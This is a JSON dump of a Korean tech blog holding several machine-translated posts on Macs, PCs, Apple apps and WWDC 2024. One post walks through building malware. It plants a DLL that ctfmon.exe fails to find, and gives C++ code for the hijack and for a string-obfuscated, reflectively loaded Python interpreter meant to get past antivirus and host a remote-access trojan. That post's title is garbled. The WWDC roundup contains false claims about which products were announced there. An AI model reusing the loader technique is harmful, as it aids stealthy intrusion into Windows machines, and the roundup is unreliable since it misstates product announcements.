{"pageProps":{"posts":[{"title":"맥과 PC 중에서 선택하는 것이 바뀔 예정입니다","description":"","date":"2024-06-19 01:16","slug":"2024-06-19-ThechoicebetweenMacandaPCisabouttochange","content":"\n\n\n![Mac vs PC](/assets/img/2024-06-19-ThechoicebetweenMacandaPCisabouttochange_0.png)\n\n맥 대 PC는 시대가 변해도 계속 논쟁이 될 주제 중 하나입니다. 왜냐하면 이것은 주관적인 결정이기 때문이죠.\n\n맥과 PC는 각자의 독특한 강점을 가지고 있지만 안심하세요, 두 플랫폼에서 모든 작업을 수행할 수 있습니다. 그들의 다재다능함은 당신이 할 수 있는 일에 제한이 없도록 보장합니다.\n\n생각해 보세요: PC를 소유하고 있다면 게임을 할 수도 있고, 오피스 문서를 만들고 수정할 수 있고, 콘텐츠를 만들고 편집하며, 좋아하는 비디오를 보고 코딩할 수 있습니다. 맥에 대해서도 똑같이 말할 수 있습니다.\n\n\n<div class=\"content-ad\"></div>\n\n당신의 PC는 게임에 관해서 더 많은 것을 제공할 수 있지만, Mac은 콘텐츠 제작에 더 많은 것을 제공할 수 있습니다. 하지만 어느 플랫폼을 선택하던지 이러한 모든 것을 할 수 있다는 것을 명심해주세요.\n\n이 차이점이 무엇일까요?\n\n노트북 리뷰어들은 일반적으로 대부분의 사람들에게 가장 좋은 노트북으로 MacBook을 추천하며, 고급 윈도우 대안이 가까운 뒤를 이어옵니다. 그러나 윈도우 만을 알고 있던 사람들은 Mac을 선택할 가능성이 낮을 것입니다. 왜냐하면 Mac을 선택하는 것이 더 큰 도박이기 때문입니다.\n\n리뷰어들은 당신의 결정은 본질적으로 원하는 플랫폼을 선택하여 결정되어야 한다고 추측합니다: Windows 또는 MacOS. 그러나 사실은, 선택한 MacBook의 장점들은 운영 체제 선호도 이상의 것이었습니다.\n\n<div class=\"content-ad\"></div>\n\n2020년 11월에 M1이 출시된 이후로, MacBooks는 어떤 PC 대안보다 성능과 배터리 효율이 훨씬 우수했습니다. PC 배터리가 주방 싱크대처럼 빠르게 방전될 때, 여러분의 Mac은 계속해서 사용할 수 있었습니다. 사실, 내 M1 MacBook Pro가 한 번의 배터리 소모 시에 2021년 델 XPS를 세 번 충전해야만 했을 정도였죠.\n\n차이가 놀라웠습니다.\n\n따라서, 편향되지 않은 추천은 항상 다음과 같이 시작해야 했습니다: 정말 강력한 프로세서와 함께 진정한 하루 종일 배터리 수명을 중요시하는가? 만약 그것이 답이라면, 구매자는 MacOS를 배워야 했습니다.\n\n상황이 역전되었습니다.\n\n<div class=\"content-ad\"></div>\n\n그러나 새로운 CoPilot+ PC 노트북은 그 상황을 바꿀 것입니다. Microsoft가 드디어 Mac의 성능과 배터리 수명을 능가하는 PC를 시장에 선보였습니다.\n\n![image](/assets/img/2024-06-19-ThechoicebetweenMacandaPCisabouttochange_1.png)\n\n이 제품을 출시할 때 Microsoft가 목표로 삼은 것은 왕이었습니다. 그 곳을 공격했습니다. M1이 출시된 이후에는 실제적인 도전자가 없이 계속 Apple이 최강자로 군림해 왔으며, 그들이 자랑스럽게 굴었습니다.\n\n그러나 이제, 이 Snapdragon과 곧 발표될 새로운 Intel 칩을 장착한 새로운 노트북 시리즈가 등장하면, Apple로부터 그들의 강력함과 효율성 장점을 빼앗을 것입니다.\n\n<div class=\"content-ad\"></div>\n\n네, 지난 4년 만에 이번에는 차이가 단순히 운영 체제 선호도 때문인 것 같아요.\n\n경쟁은 좋은 것이고, 강력한 Microsoft는 소비자에게 좋은 소식인 강력한 Apple을 만들어낼 것입니다. Apple의 가격이 다소 터무니없어지는 것을 고려하면, 이것이 가격 하락 압력을 만들어줬으면 좋겠어요.","ogImage":{"url":"/assets/img/2024-06-19-ThechoicebetweenMacandaPCisabouttochange_0.png"},"coverImage":"/assets/img/2024-06-19-ThechoicebetweenMacandaPCisabouttochange_0.png","tag":["Tech"],"readingTime":2},{"title":"제발 합법적인 방식으로 지식을 확장하거나 온라인 커뮤니티에서 도움을 받아보는 것을 고려해보세요 안전한 온라인 활동이 중요하며 악의적인 목적으로 행동하는 것은 부디 자제해 주세요 함께 안전한 인터넷 환경을 만들어 나갈 수 있기를 바랍니다","description":"","date":"2024-06-19 01:15","slug":"2024-06-19-Writemesomemalware","content":"\n\n(연구 목적으로만 사용)\n\n# 이루고 싶은 것:\n\n# 어떻게 로드할 것인가:\n\nWindows에는 ctfmon.exe라는 멋진 프로세스가 있습니다. 이 프로세스를 좋아하는 이유가 몇 가지 있어요.\n\n<div class=\"content-ad\"></div>\n\n\n![이미지](/assets/img/2024-06-19-Writemesomemalware_0.png)\n\n- 높은 권한에서 실행됩니다.\n- 충돌/중단 시 다시 시작하는 서비스가 있습니다.\n- 모든 Windows 컴퓨터에서 실행됩니다.\n\n\n<div class=\"content-ad\"></div>\n\n해당 프로세스 내에서 실행하고 싶긴 한데, 어떻게 해야할지가 문제야.\n\n\"virtual alloc — create remote thread\" 방법으로 내 자신을 주입할 수 있지만, 안티바이러스들이 이미 알고 있고 그 방법은 너무 2012년식이야. 더 나은 방법을 고민해봐야겠어.\n\n## ctfmon.exe에 로드하는 멋진 방법 찾기\n\nProcmon을 실행하고 ctfmon.exe를 다시 시작해서 무슨 일을 하는지 확인해봐.\n\n<div class=\"content-ad\"></div>\n\n\n<img src=\"/assets/img/2024-06-19-Writemesomemalware_1.png\" />\n\n음... ctfmon.exe이 LangDownloader.dll이라는 동적 라이브러리를 로드하려고 하는 것 같지만 찾을 수 없네요. 제 컴퓨터에 있는지 확인해보겠습니다.\n\n<img src=\"/assets/img/2024-06-19-Writemesomemalware_2.png\" />\n\nLangDownloader.dll이 없습니다... 하나 만들어 시스템32에 넣어 ctfmon.exe를 다시 시작해보겠습니다.\n\n\n<div class=\"content-ad\"></div>\n\n```js\nBOOL APIENTRY DllMain(HMODULE hModule,\n    DWORD  ul_reason_for_call,\n    LPVOID lpReserved\n)\n{\n    switch (ul_reason_for_call)\n    {\n\n    case DLL_PROCESS_ATTACH:\n        {\n        MessageBoxA(0, std::to_string(GetCurrentProcessId()).c_str(), 0, 0);\n        break;\n        }\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n```\n\n메시지 상자를 표시하지만 ctfmon.exe가 종료됩니다. 무언가 잘못하고 있는 것 같아요 :(\n\nLangDownloader.dll이 어떻게 로드되는지 자세히 파악하여 더 나은 모방을 하고 충돌을 방지하고 싶어요. ctfmon.exe를 좀 더 자세히 살펴보는 것이 가장 좋은 방법인 것 같아요.\n\n![이미지](/assets/img/2024-06-19-Writemesomemalware_3.png)\n\n\n<div class=\"content-ad\"></div>\n\n이 static imports만 있는 것을 볼 수 있습니다. LangDownloader.dll은 여기 없는데요... 어디서 불러오는 걸까요?\n\nProcmon으로 돌아가보면 무언가를 발견할 수도 있을 거에요\n\n![image](/assets/img/2024-06-19-Writemesomemalware_4.png)\n\n여기 보세요. InputLocaleManager.dll을 불러오고 있네요. 이 파일을 조사해봅시다.\n\n<div class=\"content-ad\"></div>\n\n해당 문자열을 찾았습니다!\n\n![image](/assets/img/2024-06-19-Writemesomemalware_5.png)\n\n여기서 잘 로드되고 있네요. 이제 뭘 할까요?\n\n![image](/assets/img/2024-06-19-Writemesomemalware_6.png)\n\n<div class=\"content-ad\"></div>\n\n한번 확대해볼까요? 저희에게 pdb 파일이 있어요 (:\n\n![image 1](/assets/img/2024-06-19-Writemesomemalware_7.png)\n\n![image 2](/assets/img/2024-06-19-Writemesomemalware_8.png)\n\n이 코드를 한 번 분석해 봐요.\n\n<div class=\"content-ad\"></div>\n\n```js\n• LangDownloader.dll을로드하려고 시도합니다.\n• 실패하는 경우\n  - “종료”로 계속 진행합니다.\n• 성공하는 경우\n  - LangDownloaderCreate의 주소를 가져오려고 시도합니다.\n  - 실패하는 경우\n     프로세스 종료\n  - 성공하는 경우\n     매개변수와 함께 LangDownloaderCreate를 호출합니다\n```\n\n지금까지 잘 됐어요. 이것은 왜 ctfmon.exe가 실행할 LangDownloader.dll이라는 임의의 .dll을 제공했을 때 충돌했는지를 설명합니다.\n\n<img src=\"/assets/img/2024-06-19-Writemesomemalware_9.png\" />\n\n우리는 0보다 작고 0x800700E와 다른 숫자를 반환하면 우리는 그냥 계속 진행할 것임을 볼 수 있습니다... 내가 신경 쓰지 않으니까 무한 대기를 해봅시다.\n\n\n<div class=\"content-ad\"></div>\n\n```js\nextern \"C\" __declspec(dllexport) int LangDownloaderCreate(int a, int b)\n{\n    // 영원히 기다려요\n    HANDLE never_set = CreateEventA(NULL, TRUE, FALSE, NULL);\n    WaitForSingleObject(never_set, INFINITE);\n\n    return -1;\n}\n```\n\n알겠어요!\n\n![이미지](/assets/img/2024-06-19-Writemesomemalware_10.png)\n\n이제 실행 중이니까... 뭘 하고 싶어요?\n\n<div class=\"content-ad\"></div>\n\n# 무엇을 실행할까요:\n\n제 .dll 내부에 인터프리터를 실행하고 싶어요... 파이썬이 어떻게 하는지 살펴봐요\n\n배운 바에 의하면, 파이썬은 python`버전`.dll을 사용해서 모든 파이썬 작업을 처리해요\n\n이 .dll을 멋지게 C++ 인터페이스로 감싸봐요\n\n<div class=\"content-ad\"></div>\n\n```js\nclass PythonInterpreter\n{\npublic:\n    explicit PythonInterpreter();\n    ~PythonInterpreter();\n\n    NO_DISCARD void* run_line(const std::string& line);\n\n    // Deleted Functions\n    PythonInterpreter(const PythonInterpreter& other) = delete;\n    PythonInterpreter(PythonInterpreter&& other) = delete;\n    PythonInterpreter& operator=(const PythonInterpreter& other) = delete;\n    PythonInterpreter& operator=(PythonInterpreter&& other) = delete;\n\nprivate:\n    using PyObject = int;\n\n    using PyInitializeType = void (*)();\n    using PyFinalizeType = void (*)();\n    using PyRunSimpleStringType = PyObject * (*)(const char* str);\n\n    // Members\n    DynamicLibrary m_python_interpreter_library;\n    PyInitializeType m_initialize;\n    PyFinalizeType m_finalize;\n    PyRunSimpleStringType m_run_simple_string;\n};\n\nPythonInterpreter::PythonInterpreter() :\n    m_python_interpreter_library(WindowsResource::get_resource(GetModuleHandleA(OBFUSCATE(\"LangDownloader.dll\")),\n                                                               IDR_BINARY1,\n                                                               OBFUSCATE(\"Binary\"))),\n    m_initialize(static_cast<PyInitializeType>(m_python_interpreter_library.get_function(OBFUSCATE(\"Py_Initialize\")))),\n    m_finalize(static_cast<PyFinalizeType>(m_python_interpreter_library.get_function(OBFUSCATE(\"Py_Finalize\")))),\n    m_run_simple_string(static_cast<PyRunSimpleStringType>(m_python_interpreter_library.get_function(OBFUSCATE(\"PyRun_SimpleString\"))))\n{\n    m_initialize();\n}\n```\n\n이제 적절한 파이썬 인터프리터가 준비되어 있으므로, LangDownlder.dll에 통합하여 반사적으로 로드할 수 있습니다.\n\nDynamicLibrary 클래스를 만들어야 합니다.\n\n```js\nclass DynamicLibrary\n{\npublic:\n    explicit DynamicLibrary(ByteSpan library_binary);\n    ~DynamicLibrary();\n\n    NO_DISCARD void* get_function(const std::string& function_name);\n\n    // Deleted Functions\n    DynamicLibrary(const DynamicLibrary& other) = delete;\n    DynamicLibrary(DynamicLibrary&& other) = delete;\n    DynamicLibrary& operator=(const DynamicLibrary& other) = delete;\n    DynamicLibrary& operator=(DynamicLibrary&& other) = delete;\n\nprivate:\n    NO_DISCARD static HMEMORYMODULE load_library(ByteSpan library_binary);\n\n    // Members\n    HMEMORYMODULE m_library_base;\n};\n```\n\n<div class=\"content-ad\"></div>\n\n이제 ctfmon.exe 내부에 파이썬 인터프리터가 있습니다!\n\n![이미지](/assets/img/2024-06-19-Writemesomemalware_11.png)\n\n정말 멋지죠? \n\n이제 남은 일은 파이썬으로 RAT을 작성하는 것뿐입니다.\n\n<div class=\"content-ad\"></div>\n\n미안해요! 전손을 올립니다(:\n\n![Image](/assets/img/2024-06-19-Writemesomemalware_12.png)","ogImage":{"url":"/assets/img/2024-06-19-Writemesomemalware_0.png"},"coverImage":"/assets/img/2024-06-19-Writemesomemalware_0.png","tag":["Tech"],"readingTime":6},{"title":"애플이 왜 그들의 생산성 앱들에게 공유를 잘하게 가르키지 못할까","description":"","date":"2024-06-19 01:13","slug":"2024-06-19-WhyCantAppleTeachitsProductivityAppstoShareNicely","content":"\n\n![img](/assets/img/2024-06-19-WhyCantAppleTeachitsProductivityAppstoShareNicely_0.png)\n\n애플의 일반 서비스 앱을 좋아하고 보통은 타사 솔루션보다 더 선호합니다. 통합성과 일관된 작동 덕분에 그렇죠. 특히 매일 사용하는 생산성 앱인 캘린더, 노트, 그리고 알림을 정말 감사하게 사용 중이에요.\n\n애플은 최근에 이러한 앱에 기능을 많이 추가했지만, 여전히 원하는 상호 운용성이 부족하죠.\n\n몇 가지 예시를 살펴봅시다.\n\n<div class=\"content-ad\"></div>\n\n## 노트\n\n이 앱은 모든 기능이 갖춰진 진정한 생산성 앱입니다. 텍스트를 다양한 방법으로 서식 지정하고, 테이블, 이미지, 체크리스트, 첨부 파일, 태그, 스마트 폴더, 잠긴 노트, 다른 사람과 공유 및 더 많은 기능을 포함할 수 있습니다.\n\n하지만, 특정 날짜와 시간에 특정 노트에 대한 알림을 받거나, 위치에 도착했을 때나 누군가에게 메시지를 보낼 때 알림을 받고 싶을 때는 어떻게 해야 할까요? 이러한 기능은 Notes에 누락되어 있습니다. 그리고 노트를 캘린더로 드래그할 수 없으며, 공유 시트를 사용하여 캘린더와 노트를 공유할 수도 없습니다.\n\n## 노트를 리마인더로 캘린더로\n\n<div class=\"content-ad\"></div>\n\nNotes 앱에는 실제로 누락된 기능이지만 Reminders 앱에서 주요하게 처리됩니다. 노트에 알림을 추가하는 방법은 해당 노트를 Reminders로 공유하는 것입니다.\n\n원하는 노트를 선택한 후 공유를 탭하고 공유 시트에서 Reminders를 선택하세요. 약간 혼란스러운 점은 이후에 이메일 주소를 입력하라는 안내가 나온다는 것입니다. 이 기능은 다른 사람과 협업하기 위해서 생성된 것으로 보입니다. 그러나, 당신만의 이메일 주소를 사용하여 공유하면 노트가 Reminders로 공유됩니다.\n\n그 후, 새로운 링크된 리마인더에 원하는 알림 매개 변수를 추가하세요. 아래는 예시입니다. 원래 노트로 편리하게 연결된 링크를 주목하세요.\n\n<div class=\"content-ad\"></div>\n\n조금 색다른 방식을 사용해서 협업 기능을 해킹했지만, 그렇다고 해서 문제 없이 작동합니다. 이렇게 우회 방법으로 모든 알림 요구를 충족시킬 수 있어서 불만을 제기하기는 좀 과한 것 같아요.\n\n자, 그러면 이번에는 어떻게 하면 알림을 캘린더에 넣어서 놓고 놓칠 일이 없도록 할까요, 만약 알림을 놓치게 되더라도요.\n\n맥을 사용하시는 분들은 알림을 원하는 날짜에 캘린더로 끌어다 놓기만 하면 됩니다. 그 후에 날짜와 시간을 조정하거나 종일 행사로 식별하고 추가적인 알림을 설정하거나 초대할 사람들을 추가할 수 있어요.\n\n하지만, 이번에는 알림이나 노트로 돌아갈 링크가 없고, 원본 알림을 변경하면 캘린더 이벤트를 삭제해서 다시 알림을 캘린더로 끌어와야 합니다. 분명히 일을 좀 해결해야 할 부분이 있고, 이 부분은 개선이 필요한 영역입니다.\n\n<div class=\"content-ad\"></div>\n\n아이폰은 어떠신가요? 리마인더에는 공유 시트가 없고, 텍스트를 선택하고 공유를 시도해도 캘린더가 작동하지 않아요.\n\n리마인더 앱에서 사용자가 캘린더에 리마인더를 표시할지 여부를 결정하도록 하는 건 어떨까요? 그렇게 하면 단독 이벤트가 아닌 링크로 처리되어, 리마인더 내에서 변경 사항이 자동으로 캘린더에 업데이트될 거예요.\n\n## 캘린더\n\n캘린더 이벤트를 메모와 공유하는 것은 정말 쉬워요, 적어도 데스크톱에서는요. MacOS에서는 단순히 캘린더에서 원하는 노트로 이벤트를 끌어다 놓기만 하면 돼요. 리마인더의 노트처럼 편리한 링크가 제공돼요. 링크를 더블 클릭하여 캘린더 이벤트를 열 수 있어요.\n\n<div class=\"content-ad\"></div>\n\n\n![Image](/assets/img/2024-06-19-WhyCantAppleTeachitsProductivityAppstoShareNicely_2.png)\n\n이것은 정말 좋아요! 그러나 캘린더 이벤트를 이동하면 노트에 업데이트되지 않고 원래 날짜를 계속 표시할 것이라는 점에 유의하세요. 그리고 다시 한 번 iOS의 캘린더에는 공유 시트가 없습니다. 이것도 정리할 필요가 있어 보입니다.\n\n자, 그럼 Reminders와 그 일정을 공유해보겠어요. 아니요, 드래그는 실패할 것이고 캘린더 이벤트를 위한 공유 시트가 없습니다. 이것 또한 일관성이 없고 개선할 여지가 있습니다.\n\n## Reminders\n\n\n<div class=\"content-ad\"></div>\n\n이미 달력에 리마인더를 공유하는 방법을 설명했지만, 메모에 리마인더를 공유하는 방법은 어떨까요?\n\n내가 제안할 수 있는 최선의 방법은 리마인더를 메모로 끌어오는 것입니다. 이 방법은 동작하지만, 되돌아갈 수 있는 링크도 없고, 할 일의 텍스트 및 날짜(있는 경우)만 메모로 끌어오게 됩니다. 따라서 \"커피 머신의 이물질을 제거하라\"는 리마인더에 일부 지시 사항을 제공하고 싶다면, 해당 지시 사항으로 시작하는 메모를 작성한 다음 해당 메모를 리마인더와 공유하여 필요한 알림을 제공할 수 있습니다. 그리고 예약된 시간에는 원본 메모로 되돌아가는 링크를 사용하여 지시 사항을 볼 수 있게 됩니다.\n\n다시 한 번, 내가 언급한 일부 제한 사항을 피할 수 있는 방법이 있지만, 애플이 자사 응용 프로그램끼리 잘 동작하도록 가르쳐준다면 훨씬 간단해질 것입니다.\n\n다음은 몇 가지 제안 사항입니다.\n\n<div class=\"content-ad\"></div>\n\n- MacOS, iPadOS 및 iOS에서 캘린더, 노트 및 알림을 위한 공유 시트에 세 앱을 모두 추가하세요.\n- MacOS에서 모든 캘린더 이벤트, 노트 또는 알림을 세 응용 프로그램 중 하나로 끌어다 놓을 수 있도록 허용하고, 원본 응용 프로그램으로 되돌아가는 링크를 제공하세요.\n- 캘린더에 알림을 표시하는 옵션을 제공하세요.\n\n이 간단한 변경 사항은 Apple 사용자들에게 전 세계적으로 더 나은 세상을 만들 수 있습니다.\n\n제가 놓친 부분이 있다면 댓글로 알려주시면 감사하겠습니다. 동의하신다면 간단한 박수 두 번으로 제 날을 밝혀주세요. 건강하세요, 다음 포스트에서 뵙겠습니다. J","ogImage":{"url":"/assets/img/2024-06-19-WhyCantAppleTeachitsProductivityAppstoShareNicely_0.png"},"coverImage":"/assets/img/2024-06-19-WhyCantAppleTeachitsProductivityAppstoShareNicely_0.png","tag":["Tech"],"readingTime":4},{"title":"2024 WWDC 최종 요약 애플이 공개한 모든 것","description":"","date":"2024-06-19 01:12","slug":"2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled","content":"\n\n애플의 WWDC 2024는 혁신적인 발표와 혁신적인 발전으로 기술 세계를 다시 한 번 들썩이게 만들었습니다. 하드웨어 업그레이드부터 소프트웨어 향상까지, 올해 개발자 컨퍼런스에서 발표된 모든 것을 종합적으로 살펴보세요.\n\n![이미지](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_0.png)\n\n# 🌟 iPad Pro M4를 만나보세요: 폭발적인 성능 재정의\n\n가장 빛나는 스타는 의심의 여지 없이 iPad Pro M4였습니다. 애플의 최신 iPad Pro는 혁신적인 M4 칩을 장착하여 이제껏 없었던 성능과 효율성을 약속합니다. 창작가이든 강력한 사용자이든, iPad Pro M4는 당신의 작업 흐름을 높일 수 있도록 디자인되었습니다. 화려한 디스플레이, 향상된 그래픽, 그리고 원활한 멀티태스킹 능력을 기대해보세요.\n\n<div class=\"content-ad\"></div>\n\n- M4 칩으로 번개 같은 빠른 성능\n- 향상된 선명도와 색상 정확도를 갖춘 ProMotion 디스플레이\n- 프로 수준의 사진 촬영 및 비디오 촬영을 위한 고급 카메라 시스템\n\n# 🚀 iOS 18: 모바일 경험의 새로운 시작\n\n애플의 새로운 iOS 18이 출시되었습니다. 이것은 iPhone 사용 방식을 변화시키는 다양한 새로운 기능을 제공합니다. 개인정보 보호를 중점적으로 다루어 개선된 제어 및 투명성을 제공합니다. 이 업데이트에는 더 스마트한 멀티태스킹, 새로운 사용자 정의 옵션 및 더 직관적인 사용자 인터페이스도 포함되어 있습니다.\n\n![이미지](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_1.png)\n\n<div class=\"content-ad\"></div>\n\n- 개인정보 보호 설정이 개선되었어요\n\n![이미지](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_2.png)\n\n- Siri 기능이 향상되었어요\n\n![이미지](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_3.png)\n\n<div class=\"content-ad\"></div>\n\n- 새로운 위젯 및 사용자 정의 기능\n\n![이미지](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_4.png)\n\n# 💻 macOS 15: 맥 경험 높이기\n\n최신 macOS 15 업데이트는 강력한 새로운 도구와 모든 Apple 기기에서 완벽한 경험을 소개합니다. 다듬어진 미학과 개선된 통합으로 macOS 15는 맥이 디지털 생활의 중심에 남아있도록 보장합니다.\n\n<div class=\"content-ad\"></div>\n\n\n![Image 1](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_5.png)\n\n- Universal Control for effortless cross-device use\n\n![Image 2](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_6.png)\n\n- Redesigned Safari with new privacy features\n\n\n<div class=\"content-ad\"></div>\n\n\n![Enhanced productivity tools for professionals](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_7.png)\n\n![⌚ WatchOS 11: Your Ultimate Health Companion](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_8.png)\n\n\n<div class=\"content-ad\"></div>\n\nWatchOS 11는 애플 워치 경험을 더욱 발전시킬 예정입니다. 새로운 건강 추적 기능, 더 많은 운동 옵션, 그리고 신선한 인터페이스로, 건강을 유지하고 연결되는 것이 이제 더 쉬워졌어요.\n\n![이미지1](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_9.png)\n\n- 고급 건강 지표와 수면 추적\n\n![이미지2](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_10.png)\n\n<div class=\"content-ad\"></div>\n\n- 새로운 운동 모드와 피트니스 챌린지\n\n![이미지](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_11.png)\n\n- 새로 디자인된 워치 페이스와 합성기호\n\n# 💼 새로운 맥북 에어와 맥북 프로: 강력함과 휴대성의 만남\n\n<div class=\"content-ad\"></div>\n\n맥북 에어와 맥북 프로의 새로운 모델은 전례없는 파워와 효율을 제공하는 M4 칩을 탑재했습니다. 멋진 레티나 디스플레이, 긴 배터리 수명 및 최고 수준의 성능으로, 학생부터 프로페셔널까지 누구에게나 완벽한 노트북입니다.\n\n- 우수한 성능을 위한 M4 칩\n\n\n<div class=\"content-ad\"></div>\n\n- 오랜 배터리 수명\n\n![image1](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_14.png)\n\n- 세련된 가벼운 디자인\n\n![image2](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_15.png)\n\n<div class=\"content-ad\"></div>\n\n# 🌐 증강 현실 및 가상 현실 혁신\n\n애플은 증강 현실(AR) 및 가상 현실(VR) 분야에서 지속적으로 혁신하고 있습니다. 2024 WWDC에서 소개된 새로운 도구 및 프레임워크는 개발자들이 전에 없던 만족스러운 경험을 창조할 수 있도록 도와줄 것입니다.\n\n- 개발자를 위한 고급 ARKit 도구\n- 게임 및 교육용 새로운 VR 경험\n- AR/VR 애플리케이션용 향상된 하드웨어 지원\n\n# 🍻 읽어 주셔서 감사합니다, 떠나시기 전에:\n\n<div class=\"content-ad\"></div>\n\nApple의 WWDC 2024는 개발자들에게 흥미로운 소식을 가져왔어요. 특히 Swift 및 SwiftUI의 최신 업데이트에 대한 소식이였죠. 이러한 개선 사항들은 코딩을 더 효율적이고 직관적이며 강력하게 만들기 위해 설계되었어요. 이에 대한 자세한 내용은 다음 기사에서 다룰 예정이에요.\n\n- 작성자에게 박수를 보내고 팔로우해주세요! 👏\n- Linkedin | GitHub에서 저를 팔로우하세요\n\n![이미지](https://miro.medium.com/v2/resize:fit:1400/0*kujG1SCrgJLl54ok.gif)","ogImage":{"url":"/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_0.png"},"coverImage":"/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_0.png","tag":["Tech"],"readingTime":4},{"title":"당신을 생산성 천재로 변신시킬 12가지 탁월한 macOS 앱","description":"","date":"2024-06-19 01:07","slug":"2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius","content":"\n\n\n![](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_0.png)\n\n맥 macOS는 피자 속 반죽처럼 멋지지 않아요.\n\n단조로운 빵을 맛있게 만드는 건 야채 조각, 치즈, 토핑, 후추 등입니다. 마찬가지로 macOS도 평범한데, 일을 즐겁게 만드는 건 애플리케이션들이에요.\n\n아직 macOS의 기본 기능에 의존하고 있다면, 시간과 정신적 에너지, 생산성을 낭비하고 있습니다.\n\n\n<div class=\"content-ad\"></div>\n\n이 글에는 macOS 기반에 올릴 앱들이 12가지 포함되어 있어요. 저는 실제로 이 중 몇 가지를 매일 사용하고 있어요 - 그래서 확실해요.\n\n## 이 기사에 포함된 앱들\n\nAI 앱 🤖\n1 — superwhisper: 음성을 텍스트로 변환하는 AI 사용\n2 — BoltAI: AI를 활용하여 글쓰기, 코딩, 학습\nX — Ready to Send: 초안 이메일 답장 생성\n개발 앱 🧑‍💻\n3 — TeaCode: 확장자로 코딩 속도 향상\n4 — Core Shell: 완전한 기능의 SSH 터미널\n백그라운드 앱\n5 — Moment: 카운트다운 이벤트 생성\n6 — Noizio: 포커스를 위해 앰비언트 사운드 켜기\n파일 관리자 📁\n7 — Commander One: 이중 창 파일 관리자\n8 — Forklift: 서버 간 파일 관리\n9 — Trickster: 최근 파일 빠르게 접근\n10 — FilePane: 파일 관리자로 시간 절약\n수학 앱 🧮\n11 — Euclid: 엑셀 수식으로 계산하기\n12 — PocketCAS: 고급 수학 방정식 풀기\n\n# #1. superwhisper\n\n<div class=\"content-ad\"></div>\n\n## ($8.49/월 또는 $249.99 영구 | Setapp에서 이용 가능)\n\nsuperwhisper는 놀라운 AI 모델인 Whisper 위에 더욱 놀라운 UI를 제공합니다.\n\n![이미지](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_1.png)\n\n그런데 Whisper는 무엇일까요?\n이는 웹에서 수집한 680,000시간의 다국어 데이터로 훈련된 OpenAI의 자동 음성 인식 모델입니다.\n\n<div class=\"content-ad\"></div>\n\n테이블 태그를 Markdown 형식으로 변경하면 됩니다.\n\n<div class=\"content-ad\"></div>\n\n슈퍼위스퍼를 설치하면 모델의 다섯 가지 변형 중 하나를 선택하라는 메시지가 표시됩니다: Fast, Nano, Standard, Pro, Ultra — (정확도와 크기를 기준으로 오름차순, 속도를 기준으로 내림차순). 컴퓨팅 성능과 인내심이 충분하다면 Ultra를 추천해요.\n\n그리고요,\n\n- 앱에는 \"회의 모드\"가 있어 시스템 및 마이크 오디오를 듣고 회의 내용을 실시간으로 변환할 수 있어요.\n- Whisper가 마음에 들지 않는다면 Anthropic, Groq 또는 Ollama로 전환할 수 있어요.\n- 앱은 100여 개 언어에서 영어로 음성을 번역할 수 있어요.\n- 그리고, 고유한 이름, 비속어, 약어를 등록하면 앱이 고려해 줄 거예요.\n\n## 2. BoltAI\n\n<div class=\"content-ad\"></div>\n\n## (시작 가격 $22 | Setapp에서 이용 가능)\n\nGPT-4o를 $0으로 이용하는 방법을 아시나요?\nSetapp에서 BoltAI를 이용하면 됩니다 (이것은 정보 전달 목적으로 작성되었으며, Setapp을 사용하도록 설득하는 것이 아닙니다).\n\n저는 Setapp 가족 요금제를 사용하고 매달 50개의 AI 크레딧을 받습니다.\n\n```js\n50 크레딧은 다음과 같은 의미입니다:\n• GPT-3.5 Turbo로 2000개의 메시지\n• GPT-4 Turbo로 100개의 메시지\n• Whisper를 이용하여 250분\n```\n\n<div class=\"content-ad\"></div>\n\n하지만 먼저 'BoltAI'가 뭔가요?\n이것은 여러 AI 모델에 대한 단일 UI입니다.\n\n![image](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_2.png)\n\n직업으로는 개발자이고 취미로는 블로거인 저는 작품에 마무리 손질을 하기 위해 AI를 사용해요. 똑똑하게, 하나의 AI 모델에만 의존하지 않아요. 왜냐하면 각 모델마다 장단점이 있거든요.\n\n그리고 AI 모델 사이를 전환하기 위해 브라우저 탭을 바꾸는 걸 싫어해요.\n\n<div class=\"content-ad\"></div>\n\n인기있는 모델인 GPT, Gemini, Claude, Stable Diffusion 및 Mistral을 위한 단일 UI가 필요했습니다. 그리고 그때 BoltAI를 발견했습니다.\n\n가장 좋은 점은 이 앱이 수십 가지의 다음과 같은 기능을 제공한다는 것입니다.\n\n```js\n• 다음과 같은 프롬프트:\n내 글을 간단히 작성, 유머 감각으로 쓰기, 반대 주장/반론 쓰기.\n• 다음과 같은 어시스턴트:\n코미디언, 건강/라이프 코치, 금융 자문가, 소프트웨어 개발자.\n```\n\nBoltAI는 UI 없이도 동일하게 효과적입니다.\n\n<div class=\"content-ad\"></div>\n\n그냥 gpt: `prompt`를 입력하고 ⇧⌘⏎를 눌러 인공지능을 인라인으로 사용하세요. 또는 /ask_`AI 